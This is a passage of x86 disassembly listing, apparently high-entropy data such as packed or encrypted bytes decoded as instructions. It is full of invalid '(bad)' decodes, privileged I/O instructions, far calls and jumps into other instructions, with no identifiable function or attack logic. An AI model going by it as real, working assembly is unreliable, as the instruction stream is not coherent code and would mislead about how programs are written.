  41b45d:	dec    esp
  41b45e:	pop    eax
  41b45f:	ja     0x41b405
  41b461:	inc    ebx
  41b462:	bound  esi,QWORD PTR [ebp+ecx*4+0x5c]
  41b466:	or     eax,0xd96f2b29
  41b46b:	add    eax,0x209daf11
  41b470:	pop    ebx
  41b471:	mov    esi,0xd6ffee1
  41b476:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b477:	mov    cl,0x3
  41b479:	cmp    DWORD PTR [ecx+0x2d],edx
  41b47c:	mov    ds:0xfaf00689,al
  41b481:	je     0x41b419
  41b483:	in     al,0x49
  41b485:	and    al,0xf9
  41b487:	push   0x2f
  41b489:	sub    DWORD PTR [esi-0x4c],esp
  41b48c:	fld    QWORD PTR [ecx+0x2a1c99b]
  41b492:	loope  0x41b47c
  41b494:	in     eax,0x56
  41b496:	pop    edi
  41b497:	ins    BYTE PTR es:[edi],dx
  41b498:	cmp    dh,BYTE PTR [edi]
  41b49a:	sub    edx,0xffffff81
  41b49d:	ss ins DWORD PTR es:[edi],dx
  41b49f:	xchg   esi,eax
  41b4a0:	pop    esi
  41b4a1:	aaa    
  41b4a2:	mov    dh,0x73
  41b4a4:	adc    DWORD PTR [ecx-0x48],esp
  41b4a7:	mov    DWORD PTR [edx+0x5a],eax
  41b4aa:	cld    
  41b4ab:	mov    dl,0xee
  41b4ad:	adc    DWORD PTR [ecx+0x719cba54],eax
  41b4b3:	int3   
  41b4b4:	cmp    BYTE PTR [ecx+0x55],ah
  41b4b7:	mov    esp,0x4be6d3ac
  41b4bc:	sub    ch,ah
  41b4be:	cmp    eax,DWORD PTR [ebp+0x434a5924]
  41b4c4:	lods   al,BYTE PTR ds:[esi]
  41b4c5:	lock into 
  41b4c7:	dec    di
  41b4c9:	push   es
  41b4ca:	mov    esp,0x401a2b3c
  41b4cf:	fsub   QWORD PTR [ebp+0x8823a67]
  41b4d5:	aaa    
  41b4d6:	fcomp  DWORD PTR [edi-0x14f56bfc]
  41b4dc:	inc    esp
  41b4dd:	and    DWORD PTR [ebx-0x8d211f6],0xeea2b1d4
  41b4e7:	add    BYTE PTR [esi-0x744b53a0],ah
  41b4ed:	inc    ebx
  41b4ee:	mov    dl,0xb6
  41b4f0:	sub    al,0x8e
  41b4f2:	shl    DWORD PTR [eax+0x296b7ddf],0xf
  41b4f9:	xor    DWORD PTR [esi],0x21f8c2dd
  41b4ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b500:	out    0x54,al
  41b502:	xor    ecx,ebx
  41b504:	sub    dl,BYTE PTR [ebp-0x7dde3aee]
  41b50a:	(bad)  
  41b50b:	xor    al,0x4f
  41b50d:	inc    ebx
  41b50e:	mov    dh,cl
  41b510:	jmp    edx
  41b512:	adc    al,0xb7
  41b514:	jae    0x41b58d
  41b516:	push   eax
  41b517:	sbb    BYTE PTR [ebx+0x79c97939],bh
  41b51d:	shr    BYTE PTR [edi],cl
  41b51f:	jg     0x41b51d
  41b521:	sub    ecx,edi
  41b523:	pushf  
  41b524:	sbb    ebp,DWORD PTR [edx]
  41b526:	popf   
  41b527:	jno    0x41b53c
  41b529:	push   0x0
  41b52b:	in     al,dx
  41b52c:	dec    esp
  41b52d:	mov    edx,0x2bd4a174
  41b532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b533:	leave  
  41b534:	or     DWORD PTR [edi+0x9c3e403],0x600f5edc
  41b53e:	jbe    0x41b581
  41b540:	xor    al,0xb4
  41b542:	sbb    ecx,ebx
	...
  41b550:	add    dh,ch
  41b552:	data16 hlt 
  41b554:	lods   eax,DWORD PTR ds:[esi]
  41b555:	cld    
  41b556:	mov    edi,0xbcb067ff
  41b55b:	hlt    
  41b55c:	xor    eax,0xb0fea32d
  41b561:	xor    al,BYTE PTR [bx+di]
  41b564:	add    BYTE PTR [ebx-0x42fffffd],ch
  41b56a:	out    0xf2,al
  41b56c:	mov    ebx,0xec7ae08a
  41b571:	sbb    dl,BYTE PTR [edx+eax*4-0x342926c6]
  41b578:	(bad)  
  41b579:	push   ss
  41b57a:	jle    0x41b5e7
  41b57c:	pop    es
  41b57d:	sbb    ebx,DWORD PTR [edx+0x3fc355be]
  41b583:	aad    0xfd
  41b585:	jp     0x41b527
  41b587:	add    al,0xd
  41b589:	and    BYTE PTR [eax],bl
  41b58b:	sub    ecx,DWORD PTR [ecx]
  41b58d:	inc    ebp
  41b58e:	aad    0xe1
  41b590:	inc    ebp
  41b591:	int    0xe
  41b593:	pop    ecx
  41b594:	mov    ds:0xfe3aaa9d,al
  41b599:	dec    eax
  41b59a:	xchg   ebp,eax
  41b59b:	xor    cl,BYTE PTR [edi]
  41b59d:	add    ecx,DWORD PTR [edx]
  41b59f:	xchg   esp,eax
  41b5a0:	call   0xf254:0x16a88ef5
  41b5a7:	cmp    eax,0xb9c7abd
  41b5ac:	outs   dx,BYTE PTR ds:[esi]
  41b5ad:	sbb    DWORD PTR [edx+0x54],edi
  41b5b0:	sub    eax,0xd7fa3f61
  41b5b5:	push   ss
  41b5b6:	aaa    
  41b5b7:	or     DWORD PTR [edi+ecx*2+0x70],ebp
  41b5bb:	inc    edx
  41b5bc:	xor    ebp,ebx
  41b5be:	lods   eax,DWORD PTR ds:[esi]
  41b5bf:	test   al,0x15
  41b5c1:	mul    cl
  41b5c3:	lock es (bad) 
  41b5c6:	test   eax,0x9e3f4e83
  41b5cb:	les    ebp,FWORD PTR [ebx-0x5c]
  41b5ce:	xor    BYTE PTR [edi+eiz*1+0x56],dl
  41b5d2:	es ja  0x41b604
  41b5d5:	add    BYTE PTR [esi+0x77],0xc7
  41b5d9:	call   0xc21a:0x199c2e5e
  41b5e0:	(bad)  
  41b5e1:	shl    BYTE PTR [esi-0x1e497cec],cl
  41b5e7:	aad    0xe2
  41b5e9:	leave  
  41b5ea:	(bad)  
  41b5eb:	es mov ch,al
  41b5ee:	jp     0x41b639
  41b5f0:	xchg   esi,eax
  41b5f1:	add    al,0x7a
  41b5f3:	push   ecx
  41b5f4:	push   edi
  41b5f5:	sbb    BYTE PTR ds:0x144ac78d,bh
  41b5fb:	inc    esp
  41b5fc:	mov    edx,0xc36e989a
  41b601:	or     bl,0xf2
  41b604:	loopne 0x41b5c9
  41b606:	dec    ebx
  41b607:	mov    ch,0x5b
  41b609:	sub    DWORD PTR [ebp+esi*2-0x68d5f4fe],edx
  41b610:	xchg   esi,eax
  41b611:	sar    esp,0xbb
  41b614:	dec    ebx
  41b615:	add    DWORD PTR [edi+edx*1-0x285aec26],edx
  41b61c:	xchg   ebx,eax
  41b61e:	xor    bl,BYTE PTR [edi]
  41b620:	sbb    BYTE PTR [edx-0x13],0x67
  41b624:	push   0xffffffbd
  41b626:	mov    ah,0xc4
  41b628:	mov    esp,0x1f02a47b
  41b62d:	out    0x2c,eax
  41b62f:	in     al,0x61
  41b631:	jecxz  0x41b623
  41b633:	adc    eax,DWORD PTR ds:0x477d12f7
  41b639:	adc    ebp,edi
  41b63b:	push   edi
  41b63c:	ficomp WORD PTR [ecx+0x44]
  41b63f:	gs ja  0x41b681
  41b642:	cwde   
  41b643:	neg    bl
  41b645:	stos   DWORD PTR es:[edi],eax
  41b646:	nop
  41b647:	add    dh,BYTE PTR es:[ecx-0x1]
  41b64b:	mov    al,ds:0x18fd2993
  41b650:	or     BYTE PTR [edx],bl
  41b652:	aad    0xb0
  41b654:	pushf  
  41b655:	cmp    ch,BYTE PTR [eax+0x53]
  41b658:	test   eax,0xa08b8928
  41b65d:	mov    eax,0x7ba4a392
  41b662:	aam    0x8b
  41b664:	mov    DWORD PTR [ebx+0x2e],ebp
  41b667:	mov    cx,0x3ea1
  41b66b:	jecxz  0x41b642
  41b66d:	pop    ecx
  41b66e:	outs   dx,BYTE PTR ds:[esi]
  41b66f:	loope  0x41b6e3
  41b671:	adc    eax,0x2b7ee300
  41b676:	xor    ch,dl
  41b678:	mov    DWORD PTR [edi],ecx
  41b67a:	test   al,0x79
  41b67c:	ret    
  41b67d:	sti    
  41b67e:	push   0x8
  41b680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b681:	fisttp QWORD PTR [esi-0x11c4d37f]
  41b687:	and    esp,DWORD PTR ds:0xb0bc2d8e
  41b68d:	jne    0x41b697
  41b68f:	ret    0xdb49
  41b692:	clc    
  41b693:	imul   ecx,DWORD PTR [ebp+0x7d],0x63
  41b697:	loop   0x41b715
  41b699:	jle    0x41b6d6
  41b69b:	iret   
  41b69c:	pusha  
  41b69d:	inc    esi
  41b69e:	mov    BYTE PTR [ecx+esi*8],bl
  41b6a1:	add    ebp,edx
  41b6a3:	xlat   BYTE PTR ds:[ebx]
  41b6a4:	mov    al,dh
  41b6a6:	adc    al,0x13
  41b6a8:	cdq    
  41b6a9:	ret    0x5f55
  41b6ac:	xchg   ebx,eax
  41b6ad:	ins    BYTE PTR es:[edi],dx
  41b6ae:	jmp    DWORD PTR [ebp+0x46]
  41b6b1:	adc    al,0xde
  41b6b3:	pop    ebx
  41b6b4:	hlt    
  41b6b5:	in     eax,0xfa
  41b6b7:	stc    
  41b6b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6b9:	adc    dl,BYTE PTR [esi+0x5b]
  41b6bc:	enter  0x14c0,0xf6
  41b6c0:	pop    eax
  41b6c1:	test   eax,0x773026e6
  41b6c6:	pusha  
  41b6c7:	jge    0x41b6d3
  41b6c9:	mov    BYTE PTR [esp+ebx*1-0x4f],dh
  41b6cd:	sub    BYTE PTR [eax+0x58],dh
  41b6d0:	mov    ah,0xe8
  41b6d2:	inc    ebx
  41b6d3:	mov    cl,ch
  41b6d5:	push   ebp
  41b6d6:	and    DWORD PTR [ecx-0x326f456f],edx
  41b6dc:	adc    al,bh
  41b6de:	in     eax,0xa1
  41b6e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6e1:	dec    esp
  41b6e2:	jge    0x41b6ec
  41b6e4:	imul   ebx,ecx,0xffffffa6
  41b6e7:	push   ds
  41b6e8:	cmp    BYTE PTR [ecx-0x1abc5c7f],0x0
  41b6ef:	out    dx,al
  41b6f0:	mov    ch,0x5
  41b6f2:	xor    eax,edi
  41b6f4:	loope  0x41b6e2
  41b6f6:	pop    ss
  41b6f7:	mov    bh,0x29
  41b6f9:	ret    
  41b6fa:	int    0x38
  41b6fc:	add    BYTE PTR [di],dl
  41b6ff:	lods   al,BYTE PTR ds:[esi]
  41b700:	dec    edx
  41b701:	shl    BYTE PTR [ebp-0x51],0x2a
  41b705:	add    DWORD PTR [ebx],esi
  41b707:	dec    ecx
  41b708:	fsub   DWORD PTR ds:0x47a8805
  41b70e:	fcom   QWORD PTR [ebx]
  41b710:	mov    eax,0x2793c74c
  41b715:	ret    
  41b716:	(bad)
  41b71a:	shl    DWORD PTR [esi-0x39],0x94
  41b71e:	repz sti 
  41b720:	out    0x6c,eax
  41b722:	daa    
  41b723:	mov    esi,0xb7f8cd7f
  41b728:	inc    ebx
  41b729:	ror    eax,1
  41b72b:	test   edx,ecx
  41b72d:	jle    0x41b777
  41b72f:	mov    ecx,0x56042665
  41b734:	xchg   DWORD PTR [ebx+edx*2-0x54eb66c5],esp
  41b73b:	jns    0x41b702
  41b73d:	es add esi,edi
  41b740:	xchg   DWORD PTR [ebp+0x66],eax
  41b743:	xchg   DWORD PTR [esi],eax
  41b745:	ja     0x41b719
  41b747:	push   ds
  41b748:	xor    ah,BYTE PTR ds:0xd2019457
  41b74e:	rol    BYTE PTR [ebx-0x34],0xdf
  41b752:	iret   
  41b753:	clc    
  41b754:	dec    ebp
  41b755:	lods   al,BYTE PTR ds:[esi]
  41b756:	into   
  41b757:	add    DWORD PTR [esi+0x4b],0x15
  41b75b:	wbinvd 
  41b75d:	out    0xf1,eax
  41b75f:	jl     0x41b774
  41b761:	test   eax,0x12609f8f
  41b766:	xchg   ebp,eax
  41b767:	and    eax,0x1fbb0b09
  41b76c:	mov    bl,0x7c
  41b76e:	push   esp
  41b76f:	inc    ebp
  41b770:	les    esi,FWORD PTR [esi-0x3f]
  41b773:	fst    st(5)
  41b775:	(bad)  
  41b776:	out    dx,eax
  41b777:	xor    DWORD PTR [eax+edx*2],esi
  41b77a:	sub    eax,0xc601c692
  41b77f:	mov    al,dh
  41b781:	out    0x5e,eax
  41b783:	xor    eax,0xffffff9b
  41b786:	mov    esp,0xf4ac2938
  41b78b:	mov    ds:0xb06bc673,al
  41b790:	adc    al,0xed
  41b792:	out    0x5a,al
  41b794:	xor    DWORD PTR [ecx-0x2b700af5],0x30f6e731
  41b79e:	fs jo  0x41b74a
  41b7a1:	jae    0x41b78f
  41b7a3:	mov    edi,DWORD PTR [ebx-0x31]
  41b7a6:	test   ah,dl
  41b7a8:	hlt    
  41b7a9:	mov    BYTE PTR [ebp-0x3b460d30],dl
  41b7af:	dec    edx
  41b7b0:	sub    dh,BYTE PTR [ecx]
  41b7b2:	cmp    al,0xba
  41b7b4:	test   BYTE PTR [edx+ebp*2-0x1],0x20
  41b7b9:	outs   dx,BYTE PTR ds:[esi]
  41b7ba:	xor    ebx,DWORD PTR [eax+0x48d5326f]
  41b7c0:	popf   
  41b7c1:	push   0xffffffb7
  41b7c3:	cmp    BYTE PTR [edi-0x484ff77f],0x52
  41b7ca:	dec    eax
  41b7cb:	fnstenv [edi-0x10]
  41b7ce:	sbb    BYTE PTR [edi],ch
  41b7d0:	idiv   DWORD PTR [eax-0x7c112595]
  41b7d6:	inc    esp
  41b7d7:	mov    gs,WORD PTR [ebp+ebx*4+0x6088f82c]
  41b7de:	xor    BYTE PTR [ebp+0x3cc9f180],ch
  41b7e4:	out    0xee,al
  41b7e6:	call   0x71b6:0xfe6fddc9
  41b7ed:	or     edi,DWORD PTR [edx]
  41b7ef:	jp     0x41b81a
  41b7f1:	leave  
  41b7f2:	jbe    0x41b786
  41b7f4:	mov    esp,0xa83125dd
  41b7f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7fa:	in     eax,dx
  41b7fb:	xlat   BYTE PTR ds:[ebx]
  41b7fc:	mov    edi,DWORD PTR ds:0x15924581
  41b802:	jecxz  0x41b859
  41b804:	xlat   BYTE PTR ds:[ebx]
  41b805:	xchg   ebp,eax
  41b806:	xor    bh,ah
  41b808:	jb     0x41b7e1
  41b80a:	jne    0x41b87a
  41b80c:	mov    ch,0x5c
  41b80e:	mov    edi,0x6cd6e7ab
  41b813:	call   0xb63acfa
  41b818:	ins    BYTE PTR es:[edi],dx
  41b819:	cmp    edi,DWORD PTR [esi]
  41b81b:	sbb    BYTE PTR [edx],0xc
  41b81e:	dec    edi
  41b81f:	mov    ch,dl
  41b821:	out    dx,al
  41b822:	inc    edx
  41b823:	pop    eax
  41b824:	inc    edi
  41b825:	push   ebx
  41b826:	mov    cl,0xaf
  41b828:	call   0x4b4ba52
  41b82d:	jg     0x41b898
  41b82f:	rol    DWORD PTR [edx-0x6b],1
  41b832:	fnstsw WORD PTR [edi-0x7a41d743]
  41b838:	mov    al,BYTE PTR [ebp-0x7a]
  41b83b:	fs fs jne 0x41b7fe
  41b83f:	xchg   esi,eax
  41b840:	into   
  41b841:	sub    edi,DWORD PTR [edx-0x750573e0]
  41b847:	and    DWORD PTR [ebx+0x52],edi
  41b84a:	cld    
  41b84b:	push   esi
  41b84c:	mov    al,ds:0x85fbf4bc
  41b851:	mov    ebp,0xd5619ce5
  41b856:	xor    esi,esp
  41b858:	daa    
  41b859:	and    al,al
  41b85b:	hlt    
  41b85c:	jno    0x41b7e0
  41b85e:	push   es
  41b85f:	inc    ebx
  41b860:	inc    eax
  41b861:	std    
  41b862:	mov    dl,0xf9
  41b864:	jno    0x41b7e8
  41b866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b867:	pop    ebx
  41b868:	push   edx
  41b869:	ret    0x4953
  41b86c:	jbe    0x41b8ac
  41b86e:	mov    bl,0xa7
  41b870:	test   BYTE PTR [esi],cl
  41b872:	adc    al,0xf9
  41b874:	push   ds
  41b875:	mov    WORD PTR [edx-0x7bfeb8e1],?
  41b87b:	push   0x0
  41b87d:	mov    al,0x41
  41b87f:	ins    DWORD PTR es:[edi],dx
  41b880:	inc    esi
  41b881:	push   ebp
  41b882:	push   eax
  41b883:	add    edx,DWORD PTR [edi+0x7092bed8]
  41b889:	pop    ds
  41b88a:	cli    
  41b88b:	ret    
  41b88c:	and    al,0x6
  41b88e:	jbe    0x41b902
  41b890:	or     cl,bl
  41b892:	sbb    edx,eax
  41b894:	sbb    ecx,DWORD PTR [edi+edi*2]
  41b897:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b898:	cld    
  41b899:	scas   al,BYTE PTR es:[edi]
  41b89a:	push   ss
  41b89b:	mov    WORD PTR [edi+0x46bef18c],ss
  41b8a1:	jbe    0x41b88c
  41b8a3:	xor    ebx,ebx
  41b8a5:	imul   DWORD PTR [esi+0x5c]
  41b8a8:	out    0x44,al
  41b8aa:	sub    al,dh
  41b8ac:	mov    edx,0x5bf4596
  41b8b1:	fs or  eax,0x1bc68be0
  41b8b7:	cmp    DWORD PTR [edi+0x1cc71703],ebp
  41b8bd:	mov    bh,0x78
  41b8bf:	cmovp  ecx,DWORD PTR [edi]
  41b8c2:	jno    0x41b885
  41b8c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8c5:	xchg   esp,eax
  41b8c6:	mov    esi,0x97cace60
  41b8cb:	or     eax,0x3e2319e7
  41b8d0:	or     BYTE PTR [edx],ah
  41b8d2:	inc    esp
  41b8d3:	test   DWORD PTR [esi+0x40],edi
  41b8d6:	mov    bl,0xc4
  41b8d8:	lahf   
  41b8d9:	or     esp,esp
  41b8db:	aam    0x5d
  41b8dd:	shl    DWORD PTR [edx+eax*2-0x41],1
  41b8e1:	dec    esp
  41b8e2:	popa   
  41b8e3:	sub    DWORD PTR [ecx-0x75],edi
  41b8e6:	push   es
  41b8e7:	fs pop ss
  41b8e9:	jmp    0x5b33:0xa3bf
  41b8ef:	sbb    ebx,DWORD PTR [eax+0x4df3101a]
  41b8f5:	or     al,ah
  41b8f7:	aas    
  41b8f8:	sub    DWORD PTR [ebx+0x1c3c36f1],ebx
  41b8fe:	scas   al,BYTE PTR es:[edi]
  41b8ff:	inc    eax
  41b900:	leave  
  41b901:	int3   
  41b902:	push   0x11
  41b904:	pop    edx
  41b905:	les    esp,FWORD PTR [edi]
  41b907:	out    0x53,al
  41b909:	das    
  41b90a:	inc    ecx
  41b90b:	mov    ebx,DWORD PTR [esi+esi*8-0x6fb53471]
  41b912:	xchg   edx,eax
  41b913:	out    0x0,al
	...
  41b921:	adc    eax,0x7fd60e68
  41b926:	neg    ch
  41b928:	jmp    0x41b991
  41b92a:	cli    
  41b92b:	and    BYTE PTR [esi-0x74],ah
  41b92e:	xchg   ecx,eax
  41b92f:	std    
  41b930:	int3   
  41b931:	adc    dh,BYTE PTR [esi]
  41b933:	add    DWORD PTR [eax],eax
  41b935:	stos   DWORD PTR es:[edi],eax
  41b936:	add    eax,DWORD PTR [eax]
  41b938:	add    ah,cl
  41b93a:	jmp    0x41b8e3
  41b93c:	lock jecxz 0x41b914
  41b93f:	sub    BYTE PTR [ebx+0x6f],ah
  41b942:	sbb    esp,DWORD PTR [edx-0x318e27f9]
  41b948:	bound  ebp,QWORD PTR [eax]
  41b94a:	mov    DWORD PTR [esi],0x77aa4a21
  41b950:	jl     0x41b9b2
  41b952:	ret    
  41b953:	in     al,dx
  41b954:	pop    ss
  41b955:	xchg   edx,eax
  41b956:	jb     0x41b97c
  41b958:	mov    ebx,gs
  41b95a:	adc    BYTE PTR [ebx+0x5],bl
  41b95d:	idiv   DWORD PTR [edi+0x3fcbdad2]
  41b963:	push   ss
  41b964:	add    DWORD PTR [ebp-0x39],edi
  41b967:	ss and DWORD PTR ds:[ebx],eax
  41b96b:	daa    
  41b96c:	push   eax
  41b96d:	xchg   ebp,eax
  41b96e:	js     0x41b91f
  41b970:	mov    ds:0x5b03ae34,eax
  41b975:	test   eax,0x55935c02
  41b97a:	sub    ebp,DWORD PTR [ebx+0x59b938]
  41b980:	jecxz  0x41b985
  41b982:	xor    al,0x77
  41b984:	or     al,BYTE PTR [esi-0x9]
  41b987:	mov    ds:0x958d512d,al
  41b98c:	add    esp,ebx
  41b98e:	mov    eax,DWORD PTR [ecx+0x5b]
  41b991:	adc    al,0x98
  41b993:	push   esp
  41b994:	(bad)  
  41b995:	daa    
  41b996:	mov    esp,0x24115719
  41b99b:	inc    ebx
  41b99c:	xchg   edx,eax
  41b99d:	add    al,0xe5
  41b99f:	stos   BYTE PTR es:[edi],al
  41b9a0:	jbe    0x41b9a9
  41b9a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9a3:	sbb    al,0xea
  41b9a5:	cld    
  41b9a6:	js     0x41b943
  41b9a8:	push   ds
  41b9a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9aa:	jg     0x41b94d
  41b9ac:	xor    ecx,edx
  41b9ae:	in     eax,dx
  41b9af:	cmp    eax,0x8a846c6c
  41b9b4:	and    ebx,DWORD PTR [ebx-0x5d]
  41b9b7:	aaa    
  41b9b8:	xor    ch,bh
  41b9ba:	dec    bp
  41b9bc:	jae    0x41b94f
  41b9be:	cmp    ebx,DWORD PTR [ebx+0x75]
  41b9c1:	retf   0x43fa
  41b9c4:	pop    ecx
  41b9c5:	jl     0x41ba03
  41b9c7:	out    0x54,al
  41b9c9:	dec    ebx
  41b9ca:	dec    ecx
  41b9cb:	pop    edi
  41b9cc:	pop    esi
  41b9cd:	sbb    eax,0x4bdfd830
  41b9d2:	fild   QWORD PTR [ecx-0x7366de67]
  41b9d8:	in     al,0xfc
  41b9da:	out    dx,eax
  41b9db:	popa   
  41b9dc:	lods   al,BYTE PTR ds:[esi]
  41b9dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9de:	jle    0x41b9e4
  41b9e0:	shr    eax,1
  41b9e2:	mov    WORD PTR [ebx],es
  41b9e4:	jg     0x41b99f
  41b9e6:	mov    esi,0x1e02c2
  41b9eb:	scas   eax,DWORD PTR es:[edi]
  41b9ec:	loopne 0x41b981
  41b9ee:	sbb    ecx,DWORD PTR [edi]
  41b9f0:	enter  0x28b8,0x26
  41b9f4:	sub    edi,DWORD PTR [edi+0x47]
  41b9f7:	inc    ecx
  41b9f8:	ret    0x7e83
  41b9fb:	jno    0x41b9ab
  41b9fd:	dec    edx
  41b9fe:	or     DWORD PTR [eax+edx*2+0x41e76544],ebx
  41ba05:	mov    esp,0x3ffc5abf
  41ba0a:	(bad)  
  41ba0b:	pushf  
  41ba0c:	sub    cl,BYTE PTR [edi-0x65]
  41ba0f:	jl     0x41ba55
  41ba11:	sbb    ebx,DWORD PTR cs:[esi-0x5c02f179]
  41ba18:	aaa    
  41ba19:	sub    esi,esp
  41ba1b:	imul   ebp,DWORD PTR [ecx+0x69ad7d9],0xf5137d9c
  41ba25:	(bad)  
  41ba26:	pop    eax
  41ba27:	mov    al,ds:0x7e150d78
  41ba2c:	xor    al,0xf3
  41ba2e:	mov    es,WORD PTR [edi+eiz*4+0x4f633ddf]
  41ba35:	add    DWORD PTR [ecx],edx
  41ba37:	add    eax,0x8b00f3da
  41ba3c:	and    BYTE PTR [edi],dl
  41ba3e:	fstp   QWORD PTR [ebp+edi*1-0x1]
  41ba42:	inc    DWORD PTR [edi+0x7c5cb486]
  41ba48:	cmp    al,0xb
  41ba4a:	push   esi
  41ba4b:	loopne 0x41baa7
  41ba4d:	mov    BYTE PTR [ebx+0x39],dl
  41ba50:	int    0x8a
  41ba52:	mov    ah,0x8c
  41ba54:	clc    
  41ba55:	push   eax
  41ba56:	sub    al,0x60
  41ba58:	xor    al,0x74
  41ba5a:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba5c:	call   0xdf82:0x111887d3
  41ba63:	icebp  
  41ba64:	fisub  DWORD PTR [esi+0x4695b4f0]
  41ba6a:	iret   
  41ba6b:	loop   0x41b9f7
  41ba6d:	outs   dx,BYTE PTR ds:[esi]
  41ba6e:	pusha  
  41ba6f:	sbb    DWORD PTR [edx],eax
  41ba71:	jae    0x41bae5
  41ba73:	pop    ebp
  41ba74:	xchg   DWORD PTR [ebx],esp
  41ba76:	loop   0x41baf7
  41ba78:	inc    ebp
  41ba79:	fwait
  41ba7a:	adc    ebp,DWORD PTR [edx-0xd]
  41ba7d:	fidiv  WORD PTR [eax+0x90d1da0]
  41ba83:	and    al,0x4d
  41ba85:	mov    bh,BYTE PTR [ebp+0x4ebf8172]
  41ba8b:	jl     0x41ba7d
  41ba8d:	xor    ebp,DWORD PTR ds:0x50daf981
  41ba93:	rcl    BYTE PTR [esi],1
  41ba95:	call   0xa603:0xce497113
  41ba9c:	jge    0x41bab4
  41ba9e:	or     DWORD PTR [ebx-0x4b],ebp
  41baa1:	test   BYTE PTR [esi+0x47],dh
  41baa4:	xchg   ebx,eax
  41baa5:	ret    
  41baa6:	cli    
  41baa7:	jbe    0x41bb1d
  41baa9:	xor    DWORD PTR [edx-0x22],eax
  41baac:	aaa    
  41baad:	xchg   ebp,eax
  41baae:	xlat   BYTE PTR ds:[ebx]
  41baaf:	fist   WORD PTR [eax-0x55]
  41bab2:	cmp    dl,dh
  41bab4:	shr    ebp,cl
  41bab6:	(bad)  
  41bab8:	(bad)  
  41bab9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41baba:	adc    ecx,ebx
  41babc:	scas   al,BYTE PTR es:[edi]
  41babd:	mov    cl,0xa2
  41babf:	mov    cl,0x4c
  41bac1:	cmp    ebx,DWORD PTR [esi+0x2c]
  41bac4:	jle    0x41bad3
  41bac6:	dec    esi
  41bac7:	rol    dl,cl
  41bac9:	xor    DWORD PTR [ecx+0x3143d92e],eax
  41bacf:	das    
  41bad0:	cmp    ch,ch
  41bad2:	sbb    eax,eax
  41bad4:	es mov ah,0xb7
  41bad7:	cli    
  41bad8:	cmp    esi,DWORD PTR [ecx+0x40]
  41badb:	icebp  
  41badc:	hlt    
  41badd:	adc    eax,0xdcb61a7a
  41bae2:	xchg   edi,eax
  41bae3:	mov    ebx,0x42417964
  41bae8:	sub    al,0x47
  41baea:	adc    eax,0xbbd77ff1
  41baef:	push   edi
  41baf0:	pop    ebp
  41baf1:	fnstcw WORD PTR [ecx+0x74]
  41baf4:	loope  0x41bad2
  41baf6:	fwait
  41baf7:	gs jb  0x41bab7
  41bafa:	shr    dh,cl
  41bafc:	rol    BYTE PTR [eax-0x42],1
  41baff:	and    al,0xf1
  41bb01:	mov    ah,bh
  41bb03:	clc    
  41bb04:	ins    BYTE PTR es:[edi],dx
  41bb05:	xlat   BYTE PTR ds:[ebx]
  41bb06:	dec    ebx
  41bb07:	bound  eax,QWORD PTR [ebx-0x6d]
  41bb0a:	xchg   edx,edi
  41bb0c:	pop    esi
  41bb0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb0e:	ins    BYTE PTR es:[edi],dx
  41bb0f:	cmp    edx,DWORD PTR [eax]
  41bb11:	xchg   ecx,eax
  41bb12:	and    esp,esi
  41bb14:	mov    ?,WORD PTR [ecx+0x5de5711]
  41bb1a:	out    dx,eax
  41bb1b:	aam    0xfc
  41bb1d:	xchg   ebp,eax
  41bb1e:	fdivr  st,st(6)
  41bb20:	ins    WORD PTR es:[edi],dx
  41bb22:	fnstcw WORD PTR [ebx+ebp*1-0x80]
  41bb26:	inc    edx
  41bb27:	xor    al,0xd2
  41bb29:	push   edi
  41bb2a:	cmp    al,0x9d
  41bb2c:	adc    DWORD PTR [esi-0x4aa11f30],edx
  41bb32:	xor    ebx,esp
  41bb34:	daa    
  41bb35:	pop    ds
  41bb36:	icebp  
  41bb37:	xchg   BYTE PTR [edi],dl
  41bb39:	les    ebp,FWORD PTR [eax-0x4f970772]
  41bb3f:	je     0x41baf5
  41bb41:	jb     0x41bba6
  41bb43:	push   edx
  41bb44:	rol    BYTE PTR [edx-0x77626a2e],1
  41bb4a:	cdq    
  41bb4b:	inc    esi
  41bb4c:	pusha  
  41bb4d:	inc    ebx
  41bb4e:	and    al,0x25
  41bb50:	add    cl,BYTE PTR [ebx+0x78bcfed8]
  41bb56:	les    ebp,FWORD PTR [edi+0x29]
  41bb59:	pop    ecx
  41bb5a:	xor    DWORD PTR gs:[esi-0x9],ecx
  41bb5e:	mov    esp,0x96b9e735
  41bb63:	adc    bl,BYTE PTR [ebx+0x2aded0e1]
  41bb69:	sub    cl,dl
  41bb6b:	mov    eax,ds:0x5af8be10
  41bb70:	pop    esi
  41bb71:	shl    ah,1
  41bb73:	mov    ecx,0xe7140c4e
  41bb78:	sbb    al,dh
  41bb7a:	and    dh,0x5c
  41bb7d:	sar    BYTE PTR [ecx],cl
  41bb7f:	clc    
  41bb80:	and    al,0xf
  41bb82:	mov    edx,0xd2e9e0b5
  41bb87:	push   0xffffffd2
  41bb89:	clc    
  41bb8a:	icebp  
  41bb8b:	pop    ds
  41bb8c:	sub    BYTE PTR [esi-0x49304118],dh
  41bb92:	dec    ebp
  41bb93:	xor    esi,esi
  41bb95:	dec    ebp
  41bb96:	sub    ah,dl
  41bb98:	fs push ss
  41bb9a:	inc    esi
  41bb9b:	xlat   BYTE PTR ds:[ebx]
  41bb9c:	fld    st(5)
  41bb9e:	fistp  DWORD PTR [edx+0x20bdce45]
  41bba4:	mov    ebp,0xcd8346f
  41bba9:	and    dh,BYTE PTR [esp+ecx*4+0x3f]
  41bbad:	mov    bl,0xf3
  41bbaf:	xchg   esp,eax
  41bbb0:	ret    0x39c1
  41bbb3:	lock adc bl,0x86
  41bbb7:	in     al,dx
  41bbb8:	in     al,0xe2
